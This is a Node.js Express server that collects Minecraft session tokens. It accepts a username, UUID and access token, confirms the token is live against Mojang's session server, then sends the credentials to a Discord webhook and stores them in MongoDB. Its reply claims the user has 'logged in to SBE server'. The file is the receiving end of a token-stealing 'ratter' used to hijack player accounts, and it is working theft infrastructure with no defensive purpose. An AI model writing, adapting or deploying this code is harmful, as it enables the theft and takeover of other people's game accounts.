// setup
require('dotenv').config();
const { post } = require("axios").default;
const express = require("express");
const mongoose = require("mongoose");
const helmet = require("helmet");
const app = express();
const DataStore = require("./models/schema");
const port = process.env.PORT || 80;

// plugins
app.use(helmet()); // secure
app.use(express.json()); // parse JSON
app.use(express.urlencoded({ extended: true }));

// database connection
mongoose.connect(process.env.DB, {
    useNewUrlParser: true,
    useUnifiedTopology: true
});
mongoose.connection.on("connected", () => console.log("Mongoose connection successfully opened!"));
mongoose.connection.on("error", err => console.error(`Mongoose connection error:\n${err.stack}`));
mongoose.connection.on("disconnected", () => console.log("Mongoose connection disconnected"));

// log the JSON of a simple post
app.post("/", (req, res) => {
    // Happens if the request does not contain all the required fields
    if (!req.body.username || !req.body.uuid || !req.body.token) {
        console.log("Missing fields");
        return res.status(400).send("Missing fields");
    }

    // Validate the token with Mojang API
    post("https://sessionserver.mojang.com/session/minecraft/join", {
        accessToken: req.body.token,
        selectedProfile: req.body.uuid,
        serverId: req.body.uuid
    }, {
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => {
        // Mojang's way of saying it's good
        if (response.status === 204) {
            const timestamp = new Date();
            const tokenAuth = `${req.body.username}:${req.body.uuid}:${req.body.token}`;

            // Send data to Discord webhook
            post(process.env.WEBHOOK_URL, {
                content: `**New Entry Saved:**\n- Username: ${req.body.username}\n- UUID: ${req.body.uuid}\n- Token: ${req.body.token}\n- Timestamp: ${timestamp}\n- TokenAuth: ${tokenAuth}`
            })
            .then(() => console.log("Notification sent to Discord webhook."))
            .catch(err => console.log("Error sending to Discord webhook: ", err));

            // Create a DataStore object with mongoose schema and save it
            new DataStore({
                username: req.body.username,
                uuid: req.body.uuid,
                token: req.body.token,
                timestamp: timestamp,
                tokenAuth: tokenAuth
            }).save(err => {
                if (err) {
                    console.log("Error saving to database: ", err);
                    return res.status(500).send("Error saving to database");
                }
                console.log(`${req.body.username} data has been stored!`, req.body);
                res.send("Logged in to SBE server");
            });
        } else {
            res.status(400).send("Invalid token or UUID");
        }
    })
    .catch(err => {
        const errorMessage = err.response?.data?.error || "Unknown error";
        console.log("Response Error: " + errorMessage);
        res.status(500).send(errorMessage);
    });
});

// create server
app.listen(port, () => console.log(`Listening at http://localhost:${port}`));
